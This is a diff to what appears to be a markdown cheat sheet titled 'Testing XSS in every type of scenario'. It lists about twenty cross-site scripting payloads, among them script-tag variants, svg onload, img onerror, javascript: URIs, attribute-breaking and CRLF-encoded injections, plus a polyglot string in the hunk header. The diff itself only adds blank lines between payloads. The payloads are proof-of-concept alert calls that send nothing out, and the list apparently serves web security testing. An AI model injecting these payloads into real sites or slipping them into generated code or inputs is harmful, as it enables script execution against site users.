@@ -20,24 +20,43 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 **Testing XSS in every type of scenario**
 ```js
 <script>alert(1337)</script>
+
 ><script>alert(1337)</script>
+
 <sCrIpt>alert(1337)</sCripT>
+
 ">cyborg71<script>alert(1337)</script>
+
 <svg/ onload=alert(1337)//
+
 <Svg/OnLoad=(confirm)(1337)<!--
+
 <img src=x onerror=alert(1337)>
+
 </script><img src=x onerror=alert(1337)>
+
 <iframe src="javascript:alert(1337)">
+
 ';alert(1337)//
+
 ${alert(1337)}
+
 <custom-tag onmouseover='alert(1337)'>
+
 /?x=y'%09onclick='alert(1337)'%09accessKey='x'
+
 /?'accesskey='x'onclick='alert(1337)
+
 javascript:alert(1337) (Inject in href attribute)
+
 y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
+
 "><h1>cyborg.71</h1>
+
 <script onclick="alert(1337)">
+
 <a href="javascript:alert('XSS')">Click me</a>
+
 <img src=https://i.imgflip.com/8uo0t9.jpg>
 ```
 Here, ```%09``` represents the horizontal tab character and ```%0A``` represents the newline.
